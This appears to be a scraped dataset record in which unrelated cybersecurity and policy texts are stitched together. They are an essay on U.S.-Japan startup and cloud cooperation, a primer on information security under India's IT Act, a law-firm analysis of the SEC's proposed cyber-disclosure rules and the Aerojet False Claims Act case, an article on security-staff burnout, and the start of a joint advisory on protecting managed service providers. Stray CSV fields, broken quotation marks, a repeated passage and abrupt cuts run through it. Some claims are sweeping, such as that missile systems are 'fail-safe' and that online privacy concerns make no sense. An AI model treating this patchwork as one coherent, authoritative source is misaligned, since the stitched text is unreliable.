Large firms are an integral part of startup ecosystems because they invest in startups, purchase startups, and work with startups as early customers to enable startups to scale up their operations. Much of large corporate R&D activity now involves buying startups to bring their technology in-house, and large corporate investments in startups are often made with an eye toward mergers and acquisitions. Some regulatory hurdles for such activities should be reconsidered. For example, U.S. national security measures including the implementation of the 2018 Foreign Investment Risk Review Modernization Act by the Committee on Foreign Investment in the United States, which is controlled by the U.S. Treasury Department, frustrate Japanese venture capitalists and large corporations interested in investing in U.S. startups by slowing down the process to the point that investment opportunities are lost. Although Japan is one of America’s closest allies, it was not included in the initial 2020 white list of exempted countries, which included Australia, Canada, and the United Kingdom, nor was it listed in a 2022 update that added New Zealand. Having passed relevant domestic regulations, Germany and Japan still have the possibility of joining in the future, and a speedy examination process to approve Japan would benefit both Tokyo and Washington.

The Japanese government’s current efforts to facilitate U.S. venture capital investments in Japanese startups need to be designed to avoid being undermined by short-term political considerations. Governments often struggle to maintain long-term commitments to support startup ecosystems and to make policy consistent with private sector incentives. For example, the Japanese government is exploring the possibility of spending public money on foreign venture capital funds investing in Japanese startups to harness their investment expertise. Such efforts must be immune to political pressure or internal government pressure to shut down such investments if the press or a wave of nationalistic populism criticizes the government for providing Japanese taxpayer funds to fuel the profits of foreign investors. Similar political considerations led to the failure of a prior government attempt to create a multibillion-dollar venture capital fund to invest in startups.

Structural differences between the U.S. and Japanese startup ecosystems also make it more challenging to link the two sides. U.S. startups grow rapidly into unicorns—startups valued at over $1 billion before an initial public offering (IPO)—and the size of venture capital investments and IPOs has grown rapidly over the past decade. Entrepreneurs and firms in Silicon Valley draw talent from all over the world, and a robust set of firms support this ecosystem, including accounting firms, law firms, accelerators, and incubators. Critically, industry ties to universities are extensive, with well-developed pipelines from university labs to startups, and the government, including the U.S. Department of Defense, acts as an important early buyer of startup offerings.

Japan’s startup ecosystem has matured rapidly over the past decade to a degree almost unimaginable fifteen to twenty years ago, but these startups are more of a complement to large firms than a disruptor. Japanese IPOs tend to be small, Japanese startups are often focused on their domestic market, and the country’s support businesses are still developing. Moreover, the talent pool is overwhelmingly from Japan, although in a stark departure from the past when Japanese entrepreneurs tended to come from outside the ranks of mainstream elites, the country’s startup ecosystem is now fueled by graduates of elite universities and workers that have had stints at large, prestigious corporations and in government posts. Ties between industry and universities have matured substantially, and the Japanese government is proactive in trying to support promising startups with favorable procurement regulations. Japan’s recent efforts to substantially increase its defense spending could also benefit the country’s startup ecosystem.

Cross-border collaboration between the two countries’ startup ecosystems, however, is limited. The primary mechanism has been large Japanese corporations that establish substantial footprints in Silicon Valley to invest in and collaborate with startups, and fast-growing but already large Silicon Valley startups that enter the Japanese market. Few Japanese startups and entrepreneurs have founded rapid-growth startups in Silicon Valley, and the commercialization of university research pertaining to science and technology for both sides has been limited to their own respective countries.

There is ample room for collaboration. Technologies from U.S. university research that cannot scale as fast as Silicon Valley demands, especially ones that may mitigate significant Japanese societal problems such as an ageing citizenry and depopulation, could have a real impact on people’s lives if deployed as a startup in Japan with a smaller IPO before slowly growing into a stable business as a publicly traded company. Likewise, Japanese entrepreneurs with promising university-linked technology may have startup potential on the scale of a Silicon Valley firm but simply lack the interpersonal networks and support businesses to give them a shot at growing their business as an American startup.

Government officials can provide useful support on both sides. For example, U.S. visa assistance for Japanese tech entrepreneurs working to commercialize university research would help bring international flows of science and technology expertise into the commercial arena. Opportunities for interpersonal connections between universities and startups through government-supported researcher and student exchange programs could help bridge the gap between university research funding and bootstrapped startups trying to reach deeply knowledgeable researchers. And support for technology startups to move their primary base of operations from one country to another in pursuit of market opportunities to best commercialize deep technology research could be useful. Japan should also credibly signal that its future pandemic response, while possibly entailing rigorous testing of people entering Japan, will not involve a sudden blanket ban of almost all non-Japanese travelers from entering Japan, as the government implemented in November 2021. That action sent a chill through the U.S. startup community interested in expanding into Japan, given the possibility that a surge of a new COVID-19 strain could effectively isolate their Japanese businesses and bring many forms of business, scientific, and academic collaboration to a halt.

Crafting Sound Digital Infrastructure

An accurate framing of digital infrastructure, including cloud computing and all the related implications for technologies like artificial intelligence (AI), is also critical for many of the cooperative efforts to align the two countries’ policy aims to technological and business realities.

In its simplest form, digital infrastructure can be divided into three layers: applications, platforms, and physical infrastructure. Applications are software tools or services that sit on top of platforms, which provide the resources that enable applications to function. Platforms, in turn, sit on top of physical infrastructure, such as data centers, fiber optic networks, and wireless networks. Cooperation on next-generation networks and equipment for 5G wireless takes place at the infrastructure level. Platforms are now overwhelmingly provided on a global scale by a small group of U.S.-based multinational firms such as Amazon, Google, and Microsoft, firms that have also invested billions of dollars in data centers and fiber optic network infrastructure all over the world. Applications that use these globe-spanning platforms are what make startup ecosystems around the world function. The platforms give startups instant scaling potential, low costs, and global reach. Many corporate information technology systems, and even banks’ core systems in both the United States and Japan, are now applications built on top of global cloud providers’ platforms, using a combination of the platform’s global infrastructure and the company’s own localized data centers.

Discussions about standards, infrastructure, cybersecurity, and economic security must reflect this technological and business reality. 5G wireless networks, for example, do not inherently create value in and of themselves. It is what businesses use the networks for—such as factory automation, AI-assisted driving, and other uses not yet imagined—that matters. Equipment markets are large, but much more value is created and captured by the platform and application providers, as shown by the relative sizes of the market capitalization and cash holdings of platform providers such as Amazon, Apple, Google, and Microsoft compared to equipment firms such as Huawei, Nokia, Ericsson, and Cisco.

Telecommunications infrastructure is an easy political target for cybersecurity concerns because the analogy to wiretapping is easy to understand, but platforms and applications need to be considered too. Even if a country’s physical infrastructure consists of secure, domestic equipment, using another country’s platforms with nefarious data collection practices that allow them to siphon up apps’ payment, location, and social network data may pose far greater security risks than a secure platform regardless of who provides the network equipment. For example, the U.S. government and its counterparts in numerous other countries rushed to blacklist Huawei infrastructure, but numerous smartphone apps such as TikTok have been caught collecting and transmitting unauthorized user data to external servers or third-party advertisers. Problematic information gathering and sharing by apps is a practice by no means limited to Chinese firms, driving home the point that the underlying network equipment is not always the main issue.

U.S.-Japan cooperation on cybersecurity and critical infrastructure should be framed to take into account the technology and industry conception of applications, platforms, and infrastructure layers. Cybersecurity measures covering applications, platforms, and infrastructure differ, but they are often blurred in policy discussions. For example, in recent policy discussions within Japan’s ruling Liberal Democratic Party related to Japan’s recently passed economic security bill that identified cloud computing as critical national infrastructure, the party called for domestic cloud providers to handle sensitive government information. This approach raises several questions, such as whether domestic cloud providers that offer mainly local infrastructure and customized applications, but not global platforms, can implement stronger technical cybersecurity measures than global cloud providers can. Although global cloud providers have not disclosed their exact investment amounts by country, their investments in physical data centers and network infrastructure in Japan in recent years have been substantial, and possibly more than those of several major Japanese IT firms that offer cloud services. After all, firms like Amazon have been spending billions of dollars on their data centers, with recent U.S. data centers costing over $2 billion each, and Amazon has multiple data centers in Japan serving the Tokyo and Osaka regions.

One concern driving the debate on domestic cloud computing is whether the U.S. Clarifying Lawful Overseas Use of Data (CLOUD) Act allows the U.S. government to demand that global cloud providers such as Amazon, Google, and Microsoft hand over data about Japanese citizens based in Japan from servers located in Japan. A Japanese legal expert has repudiated that view, but the U.S. government’s assurances on matters of data privacy are helpful and should be articulated frequently. A great deal of Japanese actors’ potential lies in their ability to be innovative users and producers of applications that use global cloud platforms and infrastructure. National security concerns must be balanced with careful consideration about how taking steps to limit private sector activities could isolate domestic businesses and hinder globalization.

There are also other promising areas earmarked for U.S.-Japanese cooperation in the Competitiveness and Resilience Partnership including in sectors like biotechnology and climate change mitigation and on issues such as supply chain resilience, standard setting, and data trade agreements. These areas, however, also harbor challenges that will need to be addressed, a topic that will be considered in future pieces.",Cybersecurity Failure,2022-06-07 14:12:26

Weapons of higher defence, including nuclear missiles, operate on complex cyber security systems that are fail-safe.","The success of Information Technology Revolution – 1991 is accepted as the cut-off year for this transition since in that year, investment in IT sector exceeded that in the industrial sector for the first time in US – marked the advent of the Age of Information as the Internet provided for instant communication, created borderless markets and made way for globalisation, producing the new phenomenon called Knowledge Economy.



Internet-based products and services – from mobile to Twitter and home delivery – held the sway. The fact that information would be communicated and stored on Internet produced the problem of securing it against the adversary's attempt at prying into the same or against the theft of data committed for other undesirable purposes.

The first point of clarity about the use of Internet, however, is that it is a public platform and the user, therefore, should be aware that he or she should not say on it what would not be permitted to be spoken from such a platform. Section 66 of IT Act punishes calls for violence, specific threats to persons or a brazen attack on the nation's sovereignty. The 'public' character of Internet makes it illogical for you to expect that your information fed there by you would be kept confidential – until special steps are taken by you as a user or by the organisation which obtains information from you online to safeguard it against exposure. A large part of noise raised about 'privacy' of information loaded on the Internet, therefore, made no sense.

The second fundamental thing about the use of Internet is that security in any sphere – cyber, industrial or State-related – revolves around the threats to the three assets of a target – organisation, material, human resource and protected information. Correspondingly, there are concepts of physical security, personnel security and information security for protection against what is described in professional terms as sabotage, subversion and espionage, respectively.

Taking the issue of 'information security' first – in the context of Internet – it has to be mentioned that by definition, espionage is manoeuvring 'unauthorised access to protected information.' If the organisation has not protected its information it cannot complain of breach of its security – this protection starts with the 'security classification' of the particular information in terms of its being labelled as 'restricted,' 'secret' or 'top secret' and determination of who amongst the employees would have access to it.

Security of information in the 'virtual' layer begins with the techniques of 'access control' to limit entry to authorised users – these include Firewalls, Passwords and Biometric Devices. The security policy has to be formulated with clarity to achieve effective designing and implementation of Firewalls. It is to be noted that multiple encryptions may make the security stronger but it may have a negative influence on efficiency. It is logical that passwords should be stored on record in encrypted form. And finally, Biometrics has to be extensively used for establishing the identity of the legitimate user.

There is a strong physical security side of cyber operations. At the physical layer, which is the data communication interface with the hardware, specific access controls are required. This is the layer that performs the physical transfer of data to the transmission medium. Floppy disks, magnetic tapes, pen-drives, optical disks and any other hard drive back up material should always be kept in safe custody. Printed, unclaimed and sensitive documents must be destroyed by 'shredding.'

The IT Act of India provides detailed guidelines even on a secure site design for a Data Centre or Master Computer. All openings of this Centre should be monitored round-the-clock by surveillance video-cameras. Physical security begins with the installation of a secure perimeter – which is not always a brick-and-mortar structure – and prompt detection of any attempt to make an intrusion into the same. One of its objectives is to prevent Sabotage which by definition is 'the threat of causing unacceptable physical damage to the target organisation.' Data destruction will also fall into this description. All strategic sectors of economy are run on cyber systems whose security is a must for averting a disruptive attack that would impact national stability. Code breaking may be done by the enemy by using brute force in which an attempt is made to decipher the code by using every possible key combination.

Launching a direct clandestine attack from outside may result in 'denial of service' in which the ports of the target are clogged and the network resource is degraded. Data destruction may be caused by injecting a virus through false messaging. A malicious website may be used to download a virus. Unfortunately, any 'hacking' or unauthorised penetration of the system is detected only after it has succeeded and that is why emergency response to any such event is important for mitigating the damage.

The Personnel Security component of cyber domain is often underestimated for lack of understanding of the ways in which the threat against it came into play without getting detected. In all systems having a direct bearing on national security, the angle of threat of Subversion, which by definition is rooted in the enemy's capacity to alter the loyalty of an employee of the target organisation, is accorded high priority. The standards of Personnel Security – which aim at preventing this subversion – are more stringent in the sensitive sectors of national security.

The third basic feature of cyber security relates to a universal finding that nearly half of the breaches there were attributable to an insider. One of the tasks of the security set up of a sensitive enterprise is to take note of any 'suspicious' conduct of an employee and check out on that to determine if the individual was not already working for some outsider.

Further, the practice of 'need to know' principle is meant to enforce 'restrictive security' by which the employee is given access to only that part of organisational knowledge which was essential for the individual's own performance – this reduces the subversive potential of a compromised member.

It is for this reason that internal Firewalls are also used to protect one area of a company from another in pursuance of 'restrictive security.' In an Intelligence organisation, where the 'need to know' principle is followed in totality, members understand what part of operational knowledge is not to be shared with the colleagues. They also know that restrictive security did not operate vertically.

A fourth essential point about cyber security is that its framework rests on certain requisites – legal, operational and managerial – and like in any other security domain, conforms to the principle that security is an 'integral' concept not given to divisibility of any kind.

Security is a mainstream function as it requires full knowledge of the enterprise and derives its authority from the top man. Training is necessary for all aspects of security and a security-savvy culture has to be established to avert avoidable failures. Finally, the cyber domain is an instrument of development and facilitates the welfare function of the democratic State, but it is also a licence for anti-national forces to indulge in mischief against the latter. Weapons of higher defence, including nuclear missiles, operate on complex cyber security systems that are fail-safe. In what is a new phenomenon, social media – a product of Internet – is already becoming an instrument of combat and 'proxy war.' We live in times where a minimal understanding of cyber security issues is an essential component of the requirement of 'being well-informed' – this is the mandate of the age, for being successful in any sphere of work.

The proposal would require disclosures regarding cybersecurity risk management and material cybersecurity incidents in filings on Forms 8-K, 6-K, 10-Q, 10-K and 20-F, and is likely to spur additional compliance costs and enforcement risks as the SEC steps up its policing of public company cybersecurity management and reporting. The proposal is open for public comment through May 9.

Broad definition of “cybersecurity incident” : The proposal defines “cybersecurity incident” as “an unauthorized occurrence on or conducted through a registrant’s information systems that jeopardizes the confidentiality, integrity, or availability of a registrant’s information systems or any information residing therein.” This broad definition does not focus on the identity of the bad actor (whether internal or external) or the particular tools (whether electronic or otherwise) used by the bad actor to access or compromise a company’s information systems.

The proposal would turn the guidance into a mandate for Form 8-K. Form 6-K would be revised to emphasize that material cybersecurity incidents fall within the categories of information disclosable by foreign private issuers when otherwise reported under local law. Timing—Form 8-K reporting under new Item 1.05 must happen within four business days after the company determines that it has experienced a material cybersecurity incident. This determination must be made “as soon as reasonably practicable” and disclosure cannot be delayed during the pendency of an investigation, even if delay would otherwise be permissible under laws governing cyber incident reporting. (In a bit of good news, the failure to make a Form 8-K disclosure on time would not cost Form S-3 eligibility.) Substance—Form 8-K disclosure must include when the incident occurred, its impact and the state of remediation. Updates—disclosure must be updated in subsequent Forms 10-Q, 10-K and 20-F. The proposal provides broad, non-exhaustive examples of required updates, including “any changes in the registrant’s policies and procedures” as a result of the incident. The proposal does not specify an end date for updates.

The proposal would turn the guidance into a mandate for Form 8-K. Form 6-K would be revised to emphasize that material cybersecurity incidents fall within the categories of information disclosable by foreign private issuers when otherwise reported under local law. Annual reporting : The proposal would require additional cybersecurity risk management disclosures in Forms 10-K and 20-F, including: Policies and procedures—whether the company has policies and procedures for cybersecurity risk assessment, third-party service provider risk management, incident response, disaster recovery, and programmatic improvements in response to incidents. Role of management—management’s cybersecurity expertise and its role in assessing and managing cybersecurity risk and implementing policies and procedures, including details on the company’s chief information security officer such as internal reporting lines. Governance—whether, how and how frequently the board is informed of and considers cybersecurity risk, and whether and how the board considers cybersecurity risks as part of its business strategy, risk management and financial oversight. Identification of board cybersecurity experts—perhaps most problematically, similar to requirements to name board members with financial expertise, the proposal would require companies to identify any board member with expertise in cybersecurity along with “such detail as necessary to fully describe the nature of the expertise.” (This disclosure would be a new Form 10-K or 20-F requirement, although a 10-K filer would be able to present this information in the proxy statement.)

: The proposal would require additional cybersecurity risk management disclosures in Forms 10-K and 20-F, including:

The considerations for whether a board member has cybersecurity expertise include:

whether the director has prior work experience in cybersecurity, including, for example, prior experience as an information security officer, security policy analyst, security auditor, security architect or engineer, security operations or incident response manager, or business continuity planner;

whether the director has obtained a certification or degree in cybersecurity; and

whether the director has knowledge, skills, or other background in cybersecurity, including, for example, in the areas of security policy and governance, risk management, security assessment, control evaluation, security architecture and engineering, security operations, incident handling, or business continuity planning.

Although many companies have directors who are qualified to assess cybersecurity oversight, in our experience directors usually do not have the specific technical background that the proposal seems to envision, like prior experience as an incident response manager. Because many companies today may not have a director who would meet the SEC’s stated expertise criteria (or who would be comfortable being so named), this novel disclosure requirement may impact boards’ thinking on composition and refreshment issues at a time when multiple competing priorities are also at play.

The SEC does not have general authority to regulate corporate governance, which is a matter of state law. Therefore, this is a disclosure requirement only, and not a mandate that companies have a director with the specified cybersecurity expertise. But the proposal is consistent with other ways the SEC effectively seeks to mandate governance through disclosure on the assumption that, for example, no company would want to disclose that it does not have a code of ethics or a financial expert on its audit committee. Presumably, the SEC is expecting that most companies will similarly not want to disclose that they do not have a board cybersecurity expert.

However, we view the topic of cybersecurity quite differently—it is clear to investors why a company should have a financial expert on its audit committee and a code of ethics that binds its officers, but it is much less clear that a company with a qualified CISO and robust IT infrastructure must also have an IT expert on its board with the specific technical background that the proposal contemplates. For this reason, and given the narrow definition that the SEC has proposed for board-level cybersecurity expertise, we think many companies will conclude, depending on the particular company’s business and the adequacy of its cybersecurity capability at the management level, that it is not imperative to have a board member who is able satisfy the SEC’s particular definition of cybersecurity expertise.

Potential compliance implications

Incident response may be more costly and complicated Companies will need to quickly determine cybersecurity incident materiality and make disclosures within four business days of the determination—an aggressive timeline, as compared to most other federal and state breach notification laws. The SEC also rejects delayed notification while investigating an incident, as permitted in most breach notification laws. The proposal acknowledges the complexity of materiality determinations, and provides examples of potentially material incidents including data exfiltration, ransomware, and system outages. But the breadth of these examples illustrates the potential complexity of timely materiality decisions. Companies will need to track incident response and remediation to make required updates in subsequent Form 10-Q, 10-K and 20-F filings.

De facto minimum standards for cybersecurity policies and procedures In requiring a discussion of specific cybersecurity policies and procedures in Forms 10-K and 20-F, the SEC is effectively signaling minimum standards for what these policies and procedures should cover. In her dissent from the proposal, Commissioner Peirce characterized the SEC as moving towards more direct regulation of public companies, “cloaked as a disclosure requirement.” To her point, and in addition to our observations above about board composition, the proposal would require companies to disclose practices akin to those the SEC directly requires of registered investment advisers and investment companies, including in proposed rules announced last month.



Increased enforcement risk

The proposed disclosure requirements come at the same time the SEC has stepped up cybersecurity disclosure enforcement, including recent actions involving the disclosure of hypothetical cybersecurity risks when actual events had occurred, and disclosure controls and procedures around cybersecurity event reporting.

Markus v. Aerojet Rocketdyne Inc., where relator Brian Markus, Aerojet’s former senior director of cybersecurity, alleges the company violated the False Claims Act (FCA) by concealing cybersecurity problems from the government.

When the Department of Justice declined to intervene in 2018, few would have predicted that Markus’ case would become a bellwether for a government initiative. But the Biden administration subsequently prioritized cybersecurity, and the DOJ’s new civil cyber-fraud initiative will pursue FCA theories that resemble Markus’ case and allegations.

This trial in the U.S. District Court for the Eastern District of California could thus establish a blueprint for the DOJ’s new initiative—or identify potential obstacles.

DOJ’s Civil Cyber-Fraud Initiative

In May 2021, a ransomware attack shut down an American oil pipeline system for six days. Federal and state governments had to take emergency measures to maintain the fuel supply to certain parts of the country. After the attack, President Biden issued an executive order directing improvements to cybersecurity infrastructure, including systems operated by government contractors. The order directed the federal government to “bring to bear the full scope of its authorities” to protect cybersecurity.

In October, the DOJ launched the civil cyber-fraud initiative, vowing to “hold accountable” anyone “knowingly providing deficient cybersecurity products or services, knowingly misrepresenting their cybersecurity practices or protocols, or knowingly violating obligations to monitor and report cybersecurity incidents and breaches.”

The department identified “three common cybersecurity failures that are prime candidates for potential False Claims Act Enforcement”: (1) “knowing failures to comply with cybersecurity standards” set by federal agencies; (2) “knowing misrepresentation of security controls,” such as a contractor’s “practices for monitoring its systems for breaches, or password and access requirements”; and (3) “knowing failure to timely report suspected breaches.”

Potential Issues Facing Cyber-Fraud Cases Under the FCA

Whistleblower lawsuits under the initiative will raise novel issues. Most government contractors provide goods or services other than cybersecurity. While cybersecurity is undoubtedly important, federal agencies must weigh it against their need to obtain the relevant goods and services—much as private individuals balance their own desire for cybersecurity against the necessities of online life.

Those practical realities will complicate efforts to prove that false claims about cybersecurity are “material” to payment decisions and proximately cause government losses.

Not every undisclosed statutory or regulatory violation is material, as the U.S. Supreme Court made clear in United Health Services v. United States ex rel. Escobar. Describing the FCA’s materiality requirement as “rigorous,” the court explained that even a knowing violation will not give rise to FCA liability unless it affects whether an agency will pay a claim.

If the agency has a history of paying claims despite knowing of similar infractions, the requirement likely is not material. DOJ will thus have to prove that violations of cybersecurity requirements would likely impact whether an agency would pay the relevant claim. That may prove complicated, particularly where the government pays for a specialized good or a service that it cannot easily obtain.

The DOJ may also have difficulty proving what damages an agency suffers “because of” a cybersecurity violation. Most circuits require proof of both but-for and proximate causation. A cybersecurity violation is thus unlikely to permit the DOJ to recover everything an agency paid under a contract.

Determining what damages are proximately caused by a cybersecurity violation may prove thorny. Such violations do not necessarily reduce the value of the good or service the government receives. Instead, they impose an unwanted risk. The damage the government suffers “because of” that risk can be difficult to estimate and may depend on the degree to which the risk materializes.

Watching the Aerojet Rocketdyne Trial

The Aerojet Rocketdyne trial will provide an early test of how the FCA applies to allegations of cybersecurity fraud.

Aerojet Rocketdyne develops missile-defense and space-launch systems. Markus alleges that the company fraudulently concealed its failure to comply with regulations requiring defense contractors to implement cybersecurity measures and disclose known threats.

Although the court found Aerojet had disclosed some issues with its cybersecurity, it identified material disputes of fact concerning whether the company had revealed that prior data breaches had not been fully redressed and continued to leak data. The court also cited purported discrepancies between the number of cybersecurity issues identified by outside audits and those disclosed to the government.

Despite overcoming summary judgment, Markus still faces many obstacles at trial. Among other defenses, Aerojet argues that its government contracts focus on providing aerospace equipment or research, such that noncompliance with cybersecurity regulations was neither material to agency decision-making nor a cause of any injury.

Aerojet claims to have evidence that the DOJ knew that many government contractors, including Aerojet, struggled to comply. Despite that knowledge, the Department of Defense supposedly never canceled any contracts, denied payment, or requested reimbursement based on cybersecurity issues. If credited, that evidence could prove fatal to Markus’s case on both materiality and causation.

Ultimately, the DOJ has many investigative and litigative resources that private relators do not. The civil cyber-fraud initiative will bring those resources to bear, and will also benefit from the increased emphasis President Biden’s executive order placed on cybersecurity.

But Markus’s case highlights potential obstacles to the DOJ’s efforts to use the FCA to police cybersecurity. Because the FCA focuses on monetary transactions, its invocation requires DOJ to convince courts and jurors that cybersecurity is not only important, but also is what the government is paying for.

According to Tessian research, security leaders work an average of 11 hours extra per week, with one in 10 leaders working up to 24 hours extra a week.
""As security leaders, some of our most exciting stories include pulling all-nighters to defend the organization or investigate a threat.","Burnout has become endemic in the tech industry. Image: Westend61/GETTY

With the number of data breaches in 2021 soaring past that of 2020, there is even more pressure on security teams to keep businesses secure in 2022. But at a time when strength and resilience have never been more important, burnout, low staff morale and high employee turnover could put businesses on the backfoot when attempting to manage the mounting cybersecurity threat.

Employers are already face something of a dilemma when it comes to cybersecurity in 2022. Not only is the number of attempted cyberattacks escalating worldwide, but employers face the added pressure of a tightening hiring market and record levels of resignations that are also affecting the tech industry.

This battle for talent could hit cybersecurity particularly hard. According to a survey of more than 500 IT decision makers by threat intelligence company ThreatConnect, 50% of private sector businesses already have gaps in basic, technical IT security skills within their company. What's more, 32% of IT managers and 25% of IT directors are considering quitting their jobs in the next six months – leaving employers open to a cacophony of issues across hiring, management, and IT security.

SEE: Cybersecurity is tough work, so beware of burnout

Many employees are being lured away by the prospect of better pay and more flexible working arrangements, but excessive workloads and performance pressures are also taking their toll. ThreatConnect's research found that high levels of stress were among the top three contributors to employees leaving their jobs, cited by 27% of survey respondents.

Burnout threatens cybersecurity in multiple ways. First, on the employee side. ""Human error is one of the biggest causes of data breaches in organizations, and the risk of causing a data breach or falling for a phishing attack is only heightened when employees are stressed and burned out,"" says Josh Yavor, chief information security officer (CISO) at enterprise security solutions provider Tessian.

A study conducted by Tessian and Stanford University in 2020 found that 88% of data breach incidents were caused by human error. Nearly half (47%) cited distraction as the top reason for falling for a phishing scam, while 44% blamed tiredness or stress.

""Why? Because when people are stressed or burned out, their cognitive load is overwhelmed and this makes spotting the signs of a phishing attack so much more difficult,"" Yavor tells ZDNet.

Threat actors are wise to this fact, too: ""Not only are they making spear-phishing campaigns more sophisticated, but they are targeting recipients during the afternoon slump, when people are most likely to be tired or distracted. Our data showed that most phishing attacks are sent between 2pm and 6pm.""

Carlos Rivera, principal research advisor at Info-Tech Research Group, says the role exhaustion plays in making a company susceptible to phishing attacks should not be shrugged off or underestimated. It is, therefore, good practice to create a simulated phishing initiative as part of an organization's security awareness programme, he tells ZDNet.

""This program can be optimized by enforcing an hour's worth of training per year, which can be carved into five-minute training sessions per month, 15 minutes a quarter,"" says Rivera.

""In order to have the most impact on your training effectiveness, base it on topics stemming from current events that typically manifest as tactics, techniques and procedures used by hackers.""

SEE: Cybersecurity training isn't working. And hacking attacks are only getting worse

A report by analyst Gartner recently argued that the role of the cybersecurity leader needs to be ""reframed"" from one that predominantly deals with risks within the IT department to one that is responsible for making executive-level information risk decisions and ensuring business leaders have comprehensive cybersecurity knowledge.

The analyst predicts that 50% of C-level executives will have performance requirements related to cybersecurity risk built into their employment contracts by 2026. This would mean that cybersecurity leaders will have less direct control over many of the IT decisions that would fall within their remit today.

""Cybersecurity leaders are burnt out, overworked and in 'always-on' mode,"" said Sam Olyaei, research director at Gartner. ""This is a direct reflection of how elastic the role has become over the past decade due to the growing misalignment of expectations from stakeholders within their organizations.""

Yavor also says it is critical to consider how burnout affects security teams and the knock-on effects for the wider organization. According to Tessian research, security leaders work an average of 11 hours extra per week, with one in 10 leaders working up to 24 hours extra a week. Much of this time is spent investigating and remediating threats caused by employee mistakes, and even when they've logged off, some 60% of CISOs are struggling to switch off from work because of stress.

""If CISOs are experiencing this level of burnout, imagine the impact this has on the wider organization as well as the people they work with. You're going to lose good people if teams are constantly burned out.""

Glorifying overwork

The culture around cybersecurity also needs to change, which Yavor believes wrongly idolizes overtime and sacrificing personal wellbeing for the sake of the company.

""As security leaders, some of our most exciting stories include pulling all-nighters to defend the organization or investigate a threat. But we often fail to acknowledge that the need for heroics usually indicates a failure condition, and it is not sustainable,"" he says.

""As leaders, it's critical that CISOs lead by example and to set their teams up for sustainable operational work. Ensure there is confidence in the boundaries that are set – when you're off call, you're off call – and that the whole team feels supported.""

Rivera points out that the growing popularity of remote working might be increasing the tendency of staff to put in longer hours, which may ""contribute to burnout, unaccounted absences and in some cases, higher than expected turnover.""

SEE: Tech workers are frustrated and thinking about quitting. Here's what might persuade them to stay

Security and tech teams should work with other departments to bring organizational awareness to the issue of burnout and overwork, Rivera says, which can help managers identify single points of failure and instil a culture of resiliency within the company.

This approach includes adopting a ""left-shift mindset"" within the development environment, where burnout and stress can lead to errors slipping through the gaps and making their way into published code. ""Organizations will face the least risk when introducing security as early as possible in the development process and leveraging tools to automate and support this goal,"" says Rivera.

On the technical front, building a continuous improvement/continuous delivery (CI/CD) pipeline – and deploying tools such as an integrated development environment (IDE) – will give organizations the best chance of success. ""An IDE will consist of a source code editor, debugger and build automation tools to provide the developer with self-service capabilities and identify errors in near real-time. IDE coupled with static analysis security testing and open-source scanning automated into the build pipeline will provide effective defect mitigation,"" Rivera adds.

Like any job function, communication is also critical. CISOs need to do a better job of communicating their capacity constraints, which Yavor says will set a precedent within the wider organization in admitting their own limitations.

""Be comfortable in saying, 'it's not possible for me to do these things, with the resources and the constraints we currently have,'"" he says.

""There is this unfortunate trend of heroism in the security industry – and that mindset needs to change.""

Customers should review and verify all connections between internal systems, MSP systems, and other networks.
Customers should ensure MSP accounts are not assigned to internal administrator groups; instead, restrict MSP accounts to systems managed by the MSP.","Tactical actions for MSPs and their customers to take today:

• Identify and disable accounts that are no longer in use.

• Enforce MFA on MSP accounts that access the customer environment and monitor for unexplained failed authentication.

• Ensure MSP-customer contracts transparently identify ownership of ICT security roles and responsibilities.

The cybersecurity authorities of the United Kingdom (NCSC-UK), Australia (ACSC), Canada (CCCS), New Zealand (NCSC-NZ), and the United States (CISA), (NSA), (FBI) are aware of recent reports that observe an increase in malicious cyber activity targeting managed service providers (MSPs) and expect this trend to continue.[1] This joint Cybersecurity Advisory (CSA) provides actions MSPs and their customers can take to reduce their risk of falling victim to a cyber intrusion. This advisory describes cybersecurity best practices for information and communications technology (ICT) services and functions, focusing on guidance that enables transparent discussions between MSPs and their customers on securing sensitive data. Organizations should implement these guidelines as appropriate to their unique environments, in accordance with their specific security needs, and in compliance with applicable regulations. MSP customers should verify that the contractual arrangements with their provider include cybersecurity measures in line with their particular security requirements.

The guidance provided in this advisory is specifically tailored for both MSPs and their customers and is the result of a collaborative effort from the United Kingdom National Cyber Security Centre (NCSC-UK), the Australian Cyber Security Centre (ACSC), the Canadian Centre for Cyber Security (CCCS), the New Zealand National Cyber Security Centre (NCSC-NZ), the United States' Cybersecurity and Infrastructure Security Agency (CISA), National Security Agency (NSA), and Federal Bureau of Investigation (FBI) with contributions from industry members of the Joint Cyber Defense Collaborative (JCDC). Organizations should read this advisory in conjunction with NCSC-UK guidance on actions to take when the cyber threat is heightened, CCCS guidance on Cyber Security Considerations for Consumers of Managed Services, and CISA guidance provided on the Shields Up and Shields Up Technical Guidance webpages.

Managed Service Providers

This advisory defines MSPs as entities that deliver, operate, or manage ICT services and functions for their customers via a contractual arrangement, such as a service level agreement. In addition to offering their own services, an MSP may offer services in conjunction with those of other providers. Offerings may include platform, software, and IT infrastructure services; business process and support functions; and cybersecurity services. MSPs typically manage these services and functions in their customer's network environment—either on the customer's premises or hosted in the MSP's data center. Note: this advisory does not address guidance on cloud service providers (CSPs)—providers who handle the ICT needs of their customers via cloud services such as Software-as-a-Service, Platform-as-a-Service, and Infrastructure-as-a-Service; however, MSPs may offer these services as well. (See Appendix for additional definitions.)

MSPs provide services that usually require both trusted network connectivity and privileged access to and from customer systems. Many organizations—ranging from large critical infrastructure organizations to small- and mid-sized businesses—use MSPs to manage ICT systems, store data, or support sensitive processes. Many organizations make use of MSPs to scale and support network environments and processes without expanding their internal staff or having to develop the capabilities internally.

Threat Actors Targeting MSP Access to Customer Networks

Whether the customer's network environment is on premises or externally hosted, threat actors can use a vulnerable MSP as an initial access vector to multiple victim networks, with globally cascading effects. The UK, Australian, Canadian, New Zealand, and U.S. cybersecurity authorities expect malicious cyber actors—including state-sponsored advanced persistent threat (APT) groups—to step up their targeting of MSPs in their efforts to exploit provider-customer network trust relationships. For example, threat actors successfully compromising an MSP could enable follow-on activity—such as ransomware and cyber espionage—against the MSP as well as across the MSP's customer base.

The UK, Australian, Canadian, New Zealand, and U.S. cybersecurity authorities have previously issued general guidance for MSPs and their customers.[2],[3],[4],[5],[6],[7],[8] This advisory provides specific guidance to enable transparent, well-informed discussions between MSPs and their customers that center on securing sensitive information and data. These discussions should result in a re-evaluation of security processes and contractual commitments to accommodate customer risk tolerance. A shared commitment to security will reduce risk for both MSPs and their customers, as well as the global ICT community.

Recommendations

MSPs and their Customers

The UK, Australian, Canadian, New Zealand, and U.S. cybersecurity authorities recommend MSPs and their customers implement the baseline security measures and operational controls listed in this section. Additionally, customers should ensure their contractual arrangements specify that their MSP implements these measures and controls.

